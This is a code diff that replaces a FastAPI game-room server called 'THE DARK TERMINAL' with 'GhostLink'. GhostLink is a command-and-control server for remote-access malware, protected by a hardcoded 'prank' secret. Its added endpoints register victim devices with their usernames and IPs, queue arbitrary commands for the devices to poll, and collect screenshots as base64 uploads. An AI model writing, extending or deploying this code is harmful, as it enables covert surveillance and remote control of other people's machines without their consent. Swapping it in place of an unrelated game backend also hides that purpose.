@@ -1,85 +1,95 @@
-import os
-import time
 from fastapi import FastAPI, HTTPException
-from pydantic import BaseModel, Field
+from fastapi.middleware.cors import CORSMiddleware
+from pydantic import BaseModel
+from collections import deque
+import time, base64
 
-from rooms import (
-    create_room, list_rooms, get_room, join_room,
-    save_snapshot, transfer_host
-)
+app = FastAPI()
+app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])
 
-app = FastAPI(title="THE DARK TERMINAL", version="0.1.0")
-STARTED_AT = time.time()
+SECRET = "pranksecret2025"
+pending = deque(maxlen=50)
 
-class CreateRoomRequest(BaseModel):
-    player_id: str = Field(min_length=1, max_length=64)
-    max_players: int = Field(default=4, ge=2, le=8)
+# قاموس الأجهزة المتصلة
+# { device_id: { "name": str, "ip": str, "last_seen": float, "screenshot": str } }
+devices: dict = {}
 
-class JoinRoomRequest(BaseModel):
-    player_id: str = Field(min_length=1, max_length=64)
+class Command(BaseModel):
+    secret: str
+    action: str
+    data: str = ""
+    target: str = "all"  # device_id أو all
 
-class SnapshotRequest(BaseModel):
-    player_id: str
-    version: int = Field(ge=1)
-    snapshot: dict
+class HeartBeat(BaseModel):
+    secret: str
+    device_id: str
+    username: str
+    ip: str
 
-class TransferHostRequest(BaseModel):
-    old_host: str
-    new_host: str
-    expected_epoch: int = Field(ge=1)
+class Screenshot(BaseModel):
+    secret: str
+    device_id: str
+    image: str  # base64
+
+def auth(s: str):
+    if s != SECRET:
+        raise HTTPException(403, "denied")
 
 @app.get("/")
-def root():
-    return {
-        "service": "THE DARK TERMINAL",
-        "status": "online",
-        "version": "0.1.0"
+async def root():
+    return {"status": "GhostLink online"}
+
+@app.post("/heartbeat")
+async def heartbeat(h: HeartBeat):
+    auth(h.secret)
+    devices[h.device_id] = {
+        "name": h.username,
+        "ip": h.ip,
+        "last_seen": time.time()
     }
+    if h.device_id not in [d.get("device_id") for d in list(pending)]:
+        pass
+    return {"ok": True}
 
-@app.get("/health")
-def health():
-    return {
-        "status": "ok",
-        "uptime_seconds": int(time.time() - STARTED_AT),
-        "database_configured": bool(os.getenv("DATABASE_URL"))
+@app.get("/devices")
+async def get_devices(secret: str):
+    auth(secret)
+    now = time.time()
+    online = {
+        did: {**info, "online": (now - info["last_seen"]) < 15}
+        for did, info in devices.items()
     }
+    return online
 
-@app.get("/rooms")
-def rooms():
-    return {"rooms": list_rooms()}
+@app.post("/send")
+async def send_command(cmd: Command):
+    auth(cmd.secret)
+    pending.append({
+        "action": cmd.action,
+        "data": cmd.data,
+        "target": cmd.target,
+        "ts": time.time()
+    })
+    return {"ok": True}
 
-@app.post("/rooms")
-def new_room(body: CreateRoomRequest):
-    return create_room(body.player_id, body.max_players)
+@app.get("/poll")
+async def poll(secret: str, device_id: str):
+    auth(secret)
+    for i, cmd in enumerate(list(pending)):
+        if cmd["target"] == "all" or cmd["target"] == device_id:
+            pending.remove(cmd)
+            return cmd
+    return {"action": "none", "data": ""}
 
-@app.post("/rooms/{room_id}/join")
-def join(room_id: str, body: JoinRoomRequest):
-    room, error = join_room(room_id, body.player_id)
-    if error:
-        raise HTTPException(404 if error == "ROOM_NOT_FOUND" else 409, error)
-    return room
+@app.post("/screenshot")
+async def upload_screenshot(s: Screenshot):
+    auth(s.secret)
+    if s.device_id in devices:
+        devices[s.device_id]["screenshot"] = s.image
+    return {"ok": True}
 
-@app.get("/rooms/{room_id}")
-def room_details(room_id: str):
-    room = get_room(room_id)
-    if not room:
-        raise HTTPException(404, "ROOM_NOT_FOUND")
-    return room
-
-@app.post("/rooms/{room_id}/snapshot")
-def snapshot(room_id: str, body: SnapshotRequest):
-    result, error = save_snapshot(
-        room_id, body.player_id, body.version, body.snapshot
-    )
-    if error:
-        raise HTTPException(404 if error == "ROOM_NOT_FOUND" else 409, error)
-    return result
-
-@app.post("/rooms/{room_id}/transfer-host")
-def host_transfer(room_id: str, body: TransferHostRequest):
-    result, error = transfer_host(
-        room_id, body.old_host, body.new_host, body.expected_epoch
-    )
-    if error:
-        raise HTTPException(404 if error == "ROOM_NOT_FOUND" else 409, error)
-    return result
+@app.get("/screenshot")
+async def get_screenshot(secret: str, device_id: str):
+    auth(secret)
+    img = devices.get(device_id, {}).get("screenshot")
+    return {"image": img}
